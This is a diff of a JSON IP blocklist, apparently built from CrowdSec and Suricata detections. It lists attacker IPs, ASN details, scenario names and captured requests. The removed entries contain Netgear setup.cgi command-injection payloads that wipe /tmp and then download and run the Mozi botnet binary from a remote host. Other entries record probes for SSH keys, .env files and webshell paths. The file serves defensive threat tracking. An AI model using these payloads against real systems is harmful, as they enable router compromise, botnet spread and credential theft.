@@ -1,154 +1,13 @@
 {
-  "generated_at": "2026-10-30T13:00:00Z",
+  "generated_at": "2026-10-31T01:00:00Z",
   "ttl_days": 7,
   "scope": "crowdsec",
   "counts": {
-    "total": 53,
-    "v4": 53,
+    "total": 49,
+    "v4": 49,
     "v6": 0
   },
   "items": [
-    {
-      "ip": "39.34.143.222",
-      "family": "v4",
-      "first_seen": "2026-10-16T13:00:00Z",
-      "last_seen": "2026-10-23T15:00:00Z",
-      "scenarios": [
-        "crowdsec/http-cve-probing",
-        "crowdsec/netgear_rce",
-        "suricata/SERVER-WEBAPP Netgear DGN1000 series routers authentication bypass attempt"
-      ],
-      "sources": [
-        "crowdsec",
-        "suricata"
-      ],
-      "asn": "132165",
-      "asn_name": "CONNECT-AS-AP - Connect Communications",
-      "asn_prefix": "39.34.143.0/24",
-      "payloads": [
-        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://39.34.143.222:51192/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
-        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://39.34.143.222:51192/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
-      ]
-    },
-    {
-      "ip": "137.59.218.84",
-      "family": "v4",
-      "first_seen": "2026-10-20T07:00:00Z",
-      "last_seen": "2026-10-23T15:00:00Z",
-      "scenarios": [
-        "crowdsec/http-cve-probing",
-        "crowdsec/netgear_rce",
-        "suricata/SERVER-WEBAPP Netgear DGN1000 series routers authentication bypass attempt"
-      ],
-      "sources": [
-        "crowdsec",
-        "suricata"
-      ],
-      "asn": "9541",
-      "asn_name": "CYBERNET-AP - Cyber Internet Services (Pvt) Ltd.",
-      "asn_prefix": "137.59.218.0/24",
-      "payloads": [
-        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://137.59.218.84:60339/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
-        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://137.59.218.84:60339/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
-      ]
-    },
-    {
-      "ip": "92.154.95.236",
-      "family": "v4",
-      "first_seen": "2026-10-22T07:00:00Z",
-      "last_seen": "2026-10-23T15:00:00Z",
-      "scenarios": [
-        "crowdsec/http-technology-probing",
-        "suricata/SURICATA HTTP Request unrecognized authorization method"
-      ],
-      "sources": [
-        "crowdsec",
-        "suricata"
-      ],
-      "asn": "3215",
-      "asn_name": "AS3215 Orange S.A.",
-      "asn_prefix": "92.154.0.0/17",
-      "payloads": [
-        "GET /owa/auth/logon.aspx"
-      ]
-    },
-    {
-      "ip": "34.62.80.242",
-      "family": "v4",
-      "first_seen": "2026-10-23T07:00:00Z",
-      "last_seen": "2026-10-23T13:00:00Z",
-      "scenarios": [
-        "crowdsec/http-admin-interface-probing",
-        "crowdsec/http-bad-user-agent",
-        "crowdsec/http-crawl-non_statics",
-        "crowdsec/http-dos-swithcing-ua",
-        "crowdsec/http-path-traversal-probing",
-        "crowdsec/http-probing",
-        "crowdsec/http-sensitive-files"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "396982",
-      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
-      "asn_prefix": "34.62.0.0/17",
-      "tags": [
-        "mwl:cloud=\"gcp\""
-      ],
-      "payloads": [
-        "GET /.envrc",
-        "GET /lerna.json",
-        "GET /.ssh/id_ed25519",
-        "GET /railway.json",
-        "GET /.amplifyrc",
-        "GET /supabase/config.toml",
-        "GET /railway.toml",
-        "GET /.gitlab-ci.yml",
-        "GET /",
-        "GET /robots.txt",
-        "GET /sitemap.xml",
-        "GET /sitemap_index.xml",
-        "GET /[REDACTED_DOMAIN]",
-        "GET /tpdp51zpk63djq419x21",
-        "GET /ojfdnjaud1n003va0i6z",
-        "POST /_next",
-        "POST /graphql",
-        "GET /service-account.json",
-        "POST /",
-        "GET /.env.supabase"
-      ]
-    },
-    {
-      "ip": "157.230.239.201",
-      "family": "v4",
-      "first_seen": "2026-10-23T21:00:00Z",
-      "last_seen": "2026-10-23T21:00:00Z",
-      "scenarios": [
-        "crowdsec/http-dos-swithcing-ua",
-        "crowdsec/http-probing"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "14061",
-      "asn_name": "DIGITALOCEAN-ASN - DigitalOcean",
-      "asn_prefix": "157.230.224.0/20",
-      "payloads": [
-        "HEAD /store/",
-        "HEAD /shop/",
-        "HEAD /backup/",
-        "HEAD /site1/",
-        "HEAD /web/",
-        "HEAD /en/",
-        "HEAD /fr/",
-        "HEAD /",
-        "HEAD /cms/",
-        "HEAD /home/",
-        "HEAD /blog2/",
-        "HEAD /old/",
-        "HEAD /wordpress/"
-      ]
-    },
     {
       "ip": "199.165.159.145",
       "family": "v4",
@@ -1285,6 +1144,46 @@
       "asn_prefix": "135.119.0.0/16",
       "payloads": [
         "GET /owa/auth/x.js"
+      ]
+    },
+    {
+      "ip": "132.196.59.85",
+      "family": "v4",
+      "first_seen": "2026-10-30T21:00:00Z",
+      "last_seen": "2026-10-30T21:00:00Z",
+      "scenarios": [
+        "crowdsec/http-admin-interface-probing",
+        "crowdsec/http-backdoors-attempts",
+        "crowdsec/http-crawl-non_statics",
+        "crowdsec/http-probing",
+        "crowdsec/http-wordpress-scan"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "132.196.0.0/16",
+      "payloads": [
+        "GET /lowfile.php",
+        "GET /class-walker-footer-dev.php?p=",
+        "GET /cheng.php",
+        "GET /nex.php",
+        "GET /lanbai.php",
+        "GET /zv.php",
+        "GET /wp-admin/css/about.php",
+        "GET /wp-admin/maint/wp-login.php",
+        "GET /admin.php",
+        "GET /co.php",
+        "GET /c.php",
+        "GET /wp-content/plugins/hellopress/wp_filemanager.php",
+        "GET /this_is_a_new_hello_world.php",
+        "GET /md5.php3",
+        "GET /wp-gans.php",
+        "GET /csss.php?p=",
+        "GET /ab.php",
+        "GET /wp-content/about.php",
+        "GET /db.php"
       ]
     }
   ]
